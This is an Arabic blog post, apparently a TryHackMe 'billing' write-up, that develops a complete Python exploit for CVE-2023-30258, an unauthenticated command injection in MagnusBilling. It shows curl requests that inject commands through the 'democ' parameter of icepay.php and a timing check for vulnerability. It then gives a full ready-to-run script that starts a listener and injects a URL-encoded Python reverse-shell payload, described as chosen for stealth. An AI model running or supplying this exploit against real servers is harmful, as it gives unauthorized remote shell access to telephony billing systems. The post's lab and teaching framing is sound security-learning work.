---
title: CVE-2023-30258
date: 2025-03-22
description: سكربت بايثون يستغل ثغرة في نظام magnus billing ويفتح لك اتصال عكسي للضحية
tags: ["Exploit Development"]
categories: "Exploit_Development"
---

بسم الله الرحمن الرحيم، هذه الثغرة موجودة في تحدي [billing](https://tryhackme.com/room/billing) في [tryhackme](https://tryhackme.com). الثغرة موجودة في نظام magnus billing وهذا النظام مفتوح المصدر ويقدم خدمة IP telephony، هذا التقرير من [rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)
يشرح الثغرة الموجودة. الثغرة تصنيفها unauthenticated RCE وهذا يعني أنه يمديك تنفذ أوامر على السيرفر بدون تسجيل دخول.

## استغلال الثغرة يدويا:

التقرير اللي من rapid7 يقول أن فيه سكربت تجريبي في lib/icepay/icepay.php/ هذا السكربت فيه دالة exec() وهذي الدالة تاخذ parameter موجود في طلب احضار (GET) باسم democ. خلينا نرسل طلب للنقظة ونشوف
```bash
curl http://< TARGET IP >/mbilling/lib/icepay/icepay.php\?democ=URL-encoded command inside backtiks `cmd`
```
```bash
curl http://10.10.139.224/mbilling/lib/icepay/icepay.php\?democ=%60curl%20http%3A%2F%2F10%2E9%2E0%2E238%3A8080%60
```
```bash
python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.139.224 - - [24/Mar/2025 14:29:59] "GET / HTTP/1.1" 200 -
```
ممتاز، الآن عرفنا كيف نستغل الثغرة، جاء وقت الأتمتة automation

## الأتمتة | automation

### الأساس
في البداية خلينا نستقبل معلومات من المستخدم، يمديني استعمل sys.argv[] لكني راح استعمل argparse عشان المرونة
```bash
import argparse
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The url of the target')
    parser.add_argument('-l', '--local_ip', help='the Ip of your machine', required=True)
    parser.add_argument('-p','--port', help='The port that the service is running on (default 80)', type=int, default=80)
    parser.add_argument('-e', '--entry', help='entry point for the application (default mbilling)', default='mbilling')
    args = parser.parse_args()
    url, port, entry, local_ip = args.url, args.port, args.entry, args.local_ip
    vulnerable_path = "lib/icepay/icepay.php"
    full_url = f'{url}:{port}/{entry}/{vulnerable_path}'
main()
```

### التحقق من وجود الثغرة

```bash
import requests
def check_if_vulnerable(url):
    print('[+] Checking if the target is vulnerable') 
    print('[+] Sending a sleep payload, waiting for 5 seconds delay')
    res = requests.get(f'{url}?democ=`sleep 5`') # نرسل طلب للسيرفر نخليه يسكن 5 ثواني
    if res.elapsed.total_seconds() > 4.8: # إذا كانت مدة الطلب أكثر من 4.8 ثانية يعني السيرفر متأثر
        return 1
    else:
        return 0
```

### نفتح سوكت من عندنا عشان الاتصال العكسي

```bash
def create_socket(): # نسوي السوكت
    try:
        global host
        global port
        global s
        host = ''
        port = 12657
        s = socket.socket()
    except socket.error as error:
        print(f'an error occured while creating a socket: \n{error}')


# Bind the socket to the port and wait for the connection
def bind_socket():
    try:
        global host
        global port
        global s
        print(f'[+] Binding socket to port: {port}')
        s.bind((host, port)) # نشبك السوكت على المدخل
        s.listen(5) # ننتظر الاتصال ونعطيه خمس محاولات
    except socket.error as error:
        print(f'[-] An error occured while binding {error}')


def socket_accept():
    conn, address = s.accept() # إذا جاء اتصال نقبله
    print(f'[+] Connection established | IP: {address[0]} | Port: {address[1]}')
    send_commands(conn)


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit': # نقفل الإتصال quit = إذا كان الأمر اللي رسلته
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0: # إذا كتبنا أمر، راح يتشفر وينرسل إلى السيرفر
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8') # نستقبل 1024 بايت من البيانات 
            print(client_response, end='')
```

### نرسل حمولة الإتصال العكسي

```bash
def get_shell(url,ip):
    print('[+] Getting a reverse shell on the target')
    payload = f'''python3 -c 'import os,socket,subprocess # كان يمديني أرسل ملف للسيرفر بعدين انفذه، لكن قلت انفذ كود من التيرمنل مباشرة عشان التخفي 
s=socket.socket()
s.connect(("{ip}",12657))
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd() + "# ")))
s.close()' '''
    encoded_payload = urllib.parse.quote(payload) # urlencoding لازم نشفر الحمولة
    req = requests.get(f'{url}?democ=`{encoded_payload}`') # backtik نرسل طلب للسيرفر فيه الحمولة المشفرة ، لاتنسى ال
```

### الكود كامل

```bash
#!/bin/usr/python

import requests
import argparse
import sys
import socket
import threading
import urllib.parse

def check_if_vulnerable(url):
    print('[+] Checking if the target is vulnerable')
    print('[+] Sending a sleep payload, waiting for 5 seconds delay')
    res = requests.get(f'{url}?democ=`sleep 5`')
    if res.elapsed.total_seconds() > 4.8:
        return 1
    else:
        return 0


# Create a socket for the reverse shell
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 12657
        s = socket.socket()
    except socket.error as error:
        print(f'an error occured while creating a socket: \n{error}')


# Bind the socket to the port and wait for the connection
def bind_socket():
    try:
        global host
        global port
        global s
        print(f'[+] Binding socket to port: {port}')
        s.bind((host, port))
        s.listen(5)
    except socket.error as error:
        print(f'[-] An error occured while binding {error}')


def socket_accept():
    conn, address = s.accept()
    print(f'[+] Connection established | IP: {address[0]} | Port: {address[1]}')
    send_commands(conn)


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')

def get_shell(url,ip):
    print('[+] Getting a reverse shell on the target')
    payload = f'''python3 -c 'import os,socket,subprocess
    s=socket.socket()
    s.connect(("{ip}",12657))
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd() + "# ")))
    s.close()' '''
    encoded_payload = urllib.parse.quote(payload)
    req = requests.get(f'{url}?democ=`{encoded_payload}`')


def main():
    print('[!] PoC for CVE-2023-30258, this will give you a shell, although not the best one!')
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The url of the target')
    parser.add_argument('-l', '--local_ip', help='the Ip of your machine', required=True)
    parser.add_argument('-p','--port', help='The port that the service is running on (default 80)', type=int, default=80)
    parser.add_argument('-e', '--entry', help='entry point for the application', default='mbilling')
    args = parser.parse_args()
    url, port, entry, local_ip = args.url, args.port, args.entry, args.local_ip
    vulnerable_path = "lib/icepay/icepay.php"
    full_url = f'{url}:{port}/{entry}/{vulnerable_path}'
    check = check_if_vulnerable(full_url)
    if check != 1:
        print('[-] The target is NOT VULNERABLE, try running the script again')
        sys.exit()
    print('[+] The target is VULNERABLE')
    thread = threading.Thread(target=socket_accept, daemon=True)
    create_socket()
    bind_socket()
    thread.start() # ننتظر الاتصال، فتحت ثريد جديد شغالة عليه الدالة المسؤولة عن قبول الاتصال
    get_shell(full_url, local_ip) # لو ما فتحت ثريد الدالة هذي ماراح تتفعل
    thread.join()
main()
```
نلاحظ في آخر الدالة الرئيسية إني استخدمت الثريد، عشان لازم استمع للمدخل من جهازي وأنتظر أي اتصال، والدالة socket_accept() هي المسؤولة عن قبول الاتصال، لو ما فتحت ثريد جديد البرنامج راح يوقف عند الدالة هذي وينتظر الاتصال وأنا احتاج أرسل الحمولة حقتي في أثناء انتظاري للإتصال.